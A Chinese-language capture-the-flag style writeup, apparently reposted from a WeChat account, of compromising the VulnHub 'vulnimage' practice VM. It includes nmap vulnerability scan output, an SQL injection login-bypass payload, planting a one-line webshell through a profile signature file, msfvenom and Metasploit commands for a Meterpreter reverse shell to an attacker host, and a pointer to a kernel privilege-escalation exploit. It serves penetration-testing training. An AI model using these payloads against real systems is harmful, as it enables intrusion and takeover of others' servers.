> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xx1mhMSim6H86ZS0iNfv7A)

**0x01** Introduction  

* * *

虚拟机下载页面：https://download.vulnhub.com/vulnimage/vulnimage.zip  

Description

```
"Created for Lars's students"

Source: *e-mail*
```

‍

**0x02 Writeup**  

#### 1 信息收集

##### 1.1 端口信息

nmap 扫描开放端口

```
nmap -sS -sV -p 1-65535 -T4 10.0.0.147
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34aunK4Yh9lgq87Eibo4OVW7ickibEC5bbiaDJxS0pdjZE1F2zgCKjpYWuMnw/640?wx_fmt=png)

##### 1.2 主机漏洞信息  

nmap 漏洞脚本库：

```
root@kali:~# nmap --script=vuln -p 22,25,80,139,445,3306 10.0.0.147
 22/tcp   open  ssh
 |_clamav-exec: ERROR: Script execution failed (use -d to debug)
 25/tcp   open smtp
 |_clamav-exec: ERROR: Script execution failed (use -d to debug)
 | smtp-vuln-cve2010-4344:
 |   Exim version: 4.50
 |   Exim heap overflow vulnerability (CVE-2010-4344):
 |     Exim (CVE-2010-4344): LIKELY VULNERABLE
 |   Exim privileges escalation vulnerability (CVE-2010-4345):
 |     Exim (CVE-2010-4345): LIKELY VULNERABLE
 |_ To confirm and exploit the vulnerabilities, run with --script-args='smtp-vuln-cve2010-4344.exploit'
 |_sslv2-drown:
 80/tcp   open http
 |_clamav-exec: ERROR: Script execution failed (use -d to debug)
 |_http-csrf: Couldn't find any CSRF vulnerabilities.
 |_http-dombased-xss: Couldn't find any DOM based XSS.
 | http-enum:
 |   /repo/: Possible code repository
 |   /admin/: Possible admin folder
 |   /view/index.shtml: Axis 212 PTZ Network Camera
 |   /icons/: Potentially interesting folder w/ directory listing
 |_ /view/: Potentially interesting folder
 | http-slowloris-check:
 |   VULNERABLE:
 |   Slowloris DOS attack
 |     State: LIKELY VULNERABLE
 |     IDs: CVE:CVE-2007-6750
 |       Slowloris tries to keep many connections to the target web server open and hold
 |       them open as long as possible. It accomplishes this by opening connections to
 |       the target web server and sending a partial request. By doing so, it starves
 |       the http server's resources causing Denial Of Service.
 |
 |     Disclosure date: 2009-09-17
 |     References:
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
 |_     http://ha.ckers.org/slowloris/
 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
 |_http-trace: TRACE is enabled
 | http-vuln-cve2011-3192:
 |   VULNERABLE:
 |   Apache byterange filter DoS
 |     State: VULNERABLE
 |     IDs: BID:49303 CVE:CVE-2011-3192
 |       The Apache web server is vulnerable to a denial of service attack when numerous
 |       overlapping byte ranges are requested.
 |     Disclosure date: 2011-08-19
 |     References:
 |       https://seclists.org/fulldisclosure/2011/Aug/175
 |       https://www.securityfocus.com/bid/49303
 |       https://www.tenable.com/plugins/nessus/55976
 |_     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
 139/tcp open netbios-ssn
 |_clamav-exec: ERROR: Script execution failed (use -d to debug)
 445/tcp open microsoft-ds
 |_clamav-exec: ERROR: Script execution failed (use -d to debug)
 3306/tcp open mysql
 |_clamav-exec: ERROR: Script execution failed (use -d to debug)
 MAC Address: 00:0C:29:A0:6E:A4 (VMware)
 
 Host script results:
 |_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
 |_smb-vuln-ms10-054: false
 |_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
 | smb-vuln-regsvc-dos:
 |   VULNERABLE:
 |   Service regsvc in Microsoft Windows systems vulnerable to denial of service
 |     State: VULNERABLE
 |       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
 |       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
 |       while working on smb-enum-sessions.
 |_
```

##### 1.3 Web 应用方面

应用版本信息：

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34aA80feLvT9d7qJmYSC68EQ1JZxluvH2MaHv46b6x8wWrw6jB0d0e8Sg/640?wx_fmt=png)

目录扫描：  

```
http://10.0.0.147/admin
http://10.0.0.147/admin/profile.php
http://10.0.0.147/profiles/blogger-sig.txt
```

#### 2 Flag 获取

##### 2.1 getshell

访问 80 网站首页为一个系统登录页面，测试常见 web 漏洞。

使用 burp 抓取 post 包，

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34azByicdfFCeqF4cSamg49LDRbvmUTQGkalkuxYmgWs3Uc6ZuIURK7bkg/640?wx_fmt=png)

在登陆处 password 参数存在 SQL 注入，其中网站根目录物理路径为 / var/www。  

观察报错处的 sql 语句得到绕过密码' or 1=1 -- -，登陆尝试

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34alnaiaBuglJaksia31q5D0icKHNiaYomRvJNalTW9PNf1UZn4aymhzwGLdw/640?wx_fmt=png)

成功登陆（也可以使用 sqlmap）

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34azlcs7dFKgK1FgbxCIcnAyjcrUmV1jlU0nwHDyuA40L08GNVI833v9w/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34aEXokfS7FtzkWkia1hbEgXvuaIIMsWSkL6GQnfTsUicgYkPLicC3mxu6pg/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34aVjlJA30biajwHD4YvoVMjibzAPWSvMqRSrBXduX9eQ2Y3sakbbC17TGw/640?wx_fmt=png)

从上面知道，用账户 + 密码 + 内容新建页面后可在 profiles 文件件下创建账户 - sing.txt 的文件，文件内容为自己提交内容。思路为创建一句话木马文件，至于固定的 sing.txt 查看元素  

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34a4vNHbT6yTEEGZtQrj2gEK8vERR90soNDEibFeNXTbUFIXwp7nKla9nQ/640?wx_fmt=png)

提交，成功 getshell  

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34aM6bX7WQJP9X29QgefSMMwuTdNlTeH1v6SuFRx984mn4O1yz6icoq9qg/640?wx_fmt=png)

##### 2.2 权限提升  

###### 2.2.1 shell 反弹

现在 msf 反弹 shell

```
root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.129 LPORT=4545 -f elf > shell.elf
 msf5 > use exploit/multi/handler
 msf5 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
 payload => linux/x86/meterpreter/reverse_tcp
 msf5 exploit(multi/handler) > set LPORT 4545
 msf5 exploit(multi/handler) > set LHOST 10.0.0.129
 msf5 exploit(multi/handler) > run
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34afSXkryiaqaFSjtz70BMic0Iz2cfaYQ6sDg8XGLI4bic5Xt6UGlxpGfLxA/640?wx_fmt=png)

收集系统信息

```
uname -a
  cat /etc/redhat-release
  cat /etc/crontab
  crontab -l
  ……
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34adrZIkhicasem2M0sxfVrUZ8I3qxWeESP5IiaAjmUd8hAGMCjGPCgb3HQ/640?wx_fmt=png)

###### 2.2.2 内核提权  

在 exploit-db 上搜索内核为 2.6.8 的本地权限提升 exp

https://www.exploit-db.com/exploits/9574

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34aITteA6zaxpmXxNOjfMSkz2cbcyGBM5giab3nKvficX0TMBaOXzNr2ybQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS3Wv6ocNXFvar3amjUP34axHFrT3DuD7qyZCDwORjKzGZK3454z2icKQyBgrj1JQfj0n0jhB0pbtw/640?wx_fmt=png)

更多精彩

*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
    
*   [](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486968&idx=1&sn=7f66208298cf2cec57286947ddb8b223&chksm=fcfc30aecb8bb9b8333c1d05976dbdbf33d34f2a0d2b0cdfc41e835d29b9b4bcfc352504f8e4&scene=21#wechat_redirect)[vulnhub 之 SECARMY VILLAGE: GRAYHAT CONFERENCE 靶场 writeup](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247487087&idx=1&sn=608b289cd49a502720777dd037c66406&chksm=fcfc3339cb8bba2f4c7d17fc13fc9fc7168fb90ee2d7ea81a94918d92e8e309fc3a2f3e247b3&scene=21#wechat_redirect)  
    
*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
    

![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)

**如果感觉文章不错，分享让更多的人知道吧！**